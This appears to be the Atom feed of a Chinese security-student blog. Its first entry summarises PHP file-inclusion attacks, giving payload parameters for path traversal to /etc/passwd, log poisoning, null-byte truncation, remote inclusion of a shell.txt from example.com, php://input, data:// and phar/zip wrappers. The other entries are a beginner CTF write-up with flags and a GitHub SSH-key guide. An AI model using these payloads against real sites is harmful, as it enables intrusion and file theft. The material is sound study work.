<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Kage&#39;s Blog</title>
  
  <subtitle>Kage&#39;s Blog</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-03-31T06:40:16.898Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Kage</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>文件包含漏洞小结</title>
    <link href="http://yoursite.com/2019/03/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2019/03/31/文件包含漏洞/</id>
    <published>2019-03-31T06:38:58.287Z</published>
    <updated>2019-03-31T06:40:16.898Z</updated>
    
    <content type="html"><![CDATA[<h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><p>@(技术小卖铺)[代码审计]</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>如果客户可以将恶意参数动态地添加到包含函数中，会导致恶意代码执行，敏感信息泄露，主要包括本地文件包含和远程文件包含两种形式。<br>常见函数有：include()、require()<br>区别：</p><ol><li>include是当代码执行到它的时候才加载文件,发生错误的时候只是给一个警告,然后继续往下执行</li><li>require是只要程序一执行就会立即调用文件,发生错误的时候会输出错误信息,并且终止脚本的运行</li></ol><p>require一般是用于文件头包含类文件、数据库等等文件，include一般是用于包含html模板文件<br>include_once()、require_once()与(include\require)的功能相同,只是区别于当重复调用的时候，它只会调用一次。</p><h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><ol><li><p>包含目录文件<br>?file=test.txt<br>如果里面的内容是php，则内容会被当成php执行,不是php则会读取到文件内容(用来读取/etc/passw等等配置文件的敏感信息)</p><p> ?file=./../../test.txt<br> <code>./</code>当前目录，<code>../</code>上一级目录，这样的遍历目录来读取文件</p></li><li><p>包含日志文件<br>无法上传文件的时候,可以尝试利用UA插入payload到日志文件,然后包含容器的日志文件(错误、访问文件都行),注意：选择凌晨包含最好,payload后面加一个exit()退出程序,以防大日志导致浏览器卡死,如果包含不成功,也许是open_basedir限制了目录<br>常见几个路径<br>/var/log/apache/access_log<br>/var/www/logs/access_log<br><img src="/img/1553776213389.png" alt="Alt text"></p></li><li><p>包含session文件<br>session文件一般在/tmp目录下，格式为sess_[phpsessid]</p></li><li><p>利用php流filter(过滤器，可以用来读取php文件内容，不需要开启allow_url_include)</p></li></ol><h3 id="本地文件包含小姿势"><a href="#本地文件包含小姿势" class="headerlink" title="本地文件包含小姿势"></a>本地文件包含小姿势</h3><p>审计中可以见这样的包含模板文件：<br><code>&lt;?php include(&quot;inc/&quot; . $_GET[&#39;file&#39;] . &quot;.htm&quot;); ?&gt;</code></p><ol><li>%00截断<br> /etc/passwd%00<br> （需要magic_quotes_gpc=off，PHP小于5.3.4有效）</li></ol><h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><ol><li>远程代码执行<br>?file=[http|https|ftp]://example.com/shell.txt<br>(需要allow_url_fopen=On并且 allow_url_include=On)</li><li>利用php流input(接收POST过来的值)<br>?file=php://input<br>(需要allow_url_include=On)</li><li>利用data URIs<br>?file=data://text/plain;base64,base64编码的payload<br>(需要allow_url_include=On)</li></ol><h3 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h3><ol><li>phar伪协议<br>?file=phar://test.jpg/test.php<br>利用方法，先新建一个php文件，然后在php文件中写入phpinfo，然后进行压缩为zip文件，重命名为jpg文件，然后进行phar包含</li><li>zip伪协议<br>?file=zip://C:/www/K4ge/CodeAduit/1000/include/test.jpg%23test.php<br>必须使用绝对路径</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;文件包含漏洞&quot;&gt;&lt;a href=&quot;#文件包含漏洞&quot; class=&quot;headerlink&quot; title=&quot;文件包含漏洞&quot;&gt;&lt;/a&gt;文件包含漏洞&lt;/h2&gt;&lt;p&gt;@(技术小卖铺)[代码审计]&lt;/p&gt;
&lt;h3 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;he
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>hgame-web-week1</title>
    <link href="http://yoursite.com/2019/02/03/hgame%E8%8D%89%E7%A8%BF/"/>
    <id>http://yoursite.com/2019/02/03/hgame草稿/</id>
    <published>2019-02-03T10:28:51.686Z</published>
    <updated>2019-02-07T04:20:38.012Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1-谁吃了我的flag"><a href="#1-谁吃了我的flag" class="headerlink" title="1. 谁吃了我的flag"></a>1. 谁吃了我的flag</h3><p><img src="/img/1548569716058.png" alt=""><br>获取vim备份文件<br>vim自动退出会临时备份隐藏文件 .xxx.swp<br>用linux打<br><code>vim -r .xxx.swp</code> 可以恢复备份文件<br>hgame{3eek_diScl0Sure_fRom+wEbsit@}</p><h3 id="2-换头大作战"><a href="#2-换头大作战" class="headerlink" title="2. 换头大作战"></a>2. 换头大作战</h3><p><img src="/img/1548570653300.png" alt=""><br>输入框输入，要求使用post<br>post输入<br>要求使用waterfox，更改<br>要求bilibili登录<br>最后得到flag<br>hgame{hTTp_HeaDeR_iS_Ez}</p><h3 id="3-very-easy-web"><a href="#3-very-easy-web" class="headerlink" title="3. very easy web"></a>3. very easy web</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">if(strpos(&quot;vidar&quot;,$_GET[&apos;id&apos;])!==FALSE)</span><br><span class="line">  die(&quot;&lt;p&gt;干巴爹/img/p&gt;&quot;);</span><br><span class="line"></span><br><span class="line">$_GET[&apos;id&apos;] = urldecode($_GET[&apos;id&apos;]);</span><br><span class="line">if($_GET[&apos;id&apos;] === &quot;vidar&quot;)</span><br><span class="line">&#123;</span><br><span class="line">  echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>urldecode()函数的危险问题<br>php会进行自动解码一次<br>如果使用这个函数，可以通过二次编码绕过前面的过滤<br>hgame{urlDecode_Is_GoOd}</p><h3 id="4-can-you-find-me"><a href="#4-can-you-find-me" class="headerlink" title="4. can you find me"></a>4. can you find me</h3><p><img src="/img/1548571660564.png" alt=""><br><img src="/img/1548571688433.png" alt=""><br>从返回包头找到密码woyaoflag<br>发送post密码得到flag<br>hgame{f12_1s_aMazIng111}</p><h3 id="5-Hidden-Image-in-LSB"><a href="#5-Hidden-Image-in-LSB" class="headerlink" title="5. Hidden Image in LSB"></a>5. Hidden Image in LSB</h3><p>有StegSolve打开，按下面左右调试即可<br><img src="/img/1548572207626.png" alt=""><br>hgame{LSB_is_easy_for_u}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;1-谁吃了我的flag&quot;&gt;&lt;a href=&quot;#1-谁吃了我的flag&quot; class=&quot;headerlink&quot; title=&quot;1. 谁吃了我的flag&quot;&gt;&lt;/a&gt;1. 谁吃了我的flag&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/img/1548569716058.png
      
    
    </summary>
    
      <category term="ctf" scheme="http://yoursite.com/categories/ctf/"/>
    
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
      <category term="ctf" scheme="http://yoursite.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>同一台电脑连接多个github仓库</title>
    <link href="http://yoursite.com/2019/02/03/%E5%90%8C%E4%B8%80%E5%8F%B0%E7%94%B5%E8%84%91%E8%BF%9E%E6%8E%A5%E5%A4%9A%E4%B8%AAgithub%E4%BB%93%E5%BA%93/"/>
    <id>http://yoursite.com/2019/02/03/同一台电脑连接多个github仓库/</id>
    <published>2019-02-03T08:30:05.140Z</published>
    <updated>2019-02-03T10:38:40.382Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-生成密钥"><a href="#0x01-生成密钥" class="headerlink" title="0x01.生成密钥"></a>0x01.生成密钥</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;yourname@email.com&quot;</span><br></pre></td></tr></table></figure><p>分别生成两次公钥，可以得到两组公钥和私钥</p><h3 id="0x02-在github上添加公钥"><a href="#0x02-在github上添加公钥" class="headerlink" title="0x02. 在github上添加公钥"></a>0x02. 在github上添加公钥</h3><p>不解释</p><h3 id="0x03-添加config配置文件"><a href="#0x03-添加config配置文件" class="headerlink" title="0x03. 添加config配置文件"></a>0x03. 添加config配置文件</h3><p>在.ssh文件夹下添加config文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#第一个账号 Bu1uokage</span><br><span class="line">Host github.com</span><br><span class="line">HostName github.com</span><br><span class="line">User git</span><br><span class="line">IdentityFile ~/.ssh/id_rsa</span><br><span class="line"></span><br><span class="line">#第二个账号 K4ge</span><br><span class="line">Host K4ge</span><br><span class="line">HostName github.com</span><br><span class="line">User git</span><br><span class="line">IdentityFile ~/.ssh/id_rsa_K4ge</span><br></pre></td></tr></table></figure></p><p>说明：</p><ol><li>Host 可以是自定义的随机别名，如<code>K4ge</code>，在后面clone时会用到</li><li>Hostname 就默认配置就好</li><li>User默认就使用git就好</li><li>IdentityFile即公钥对应目录</li></ol><h3 id="0x04-SSH连接"><a href="#0x04-SSH连接" class="headerlink" title="0x04. SSH连接"></a>0x04. SSH连接</h3><p>如果出现Could not open a connection to your authentication agent错误。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-agent bash</span><br></pre></td></tr></table></figure></p><p>可以使用上述命令解决</p><p>添加ssh到agent中，<code>ssh-add -D</code>将agent中的删除，然后再依次添加。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh-add id_rsa</span><br><span class="line">ssh-add id_rsa_K4ge</span><br><span class="line">ssh-add -l</span><br></pre></td></tr></table></figure></p><p>测试连接远程github服务器<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br><span class="line">ssh -T K4ge</span><br></pre></td></tr></table></figure></p><h3 id="0x05-git实战"><a href="#0x05-git实战" class="headerlink" title="0x05. git实战"></a>0x05. git实战</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git clone git@github.com:K4ge/gitskills.git</span><br><span class="line">git remote rm origin</span><br><span class="line">git remote add origin git@K4ge:K4ge/gitksills.git</span><br><span class="line">git add README.md</span><br><span class="line">git commit -m &quot;new README&quot;</span><br><span class="line">git push origin master</span><br></pre></td></tr></table></figure><p>先删除当前为github.com的remote<br>然后添加新的remote为K4ge，然后就可以push到新账号了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-生成密钥&quot;&gt;&lt;a href=&quot;#0x01-生成密钥&quot; class=&quot;headerlink&quot; title=&quot;0x01.生成密钥&quot;&gt;&lt;/a&gt;0x01.生成密钥&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;t
      
    
    </summary>
    
    
  </entry>
  
</feed>
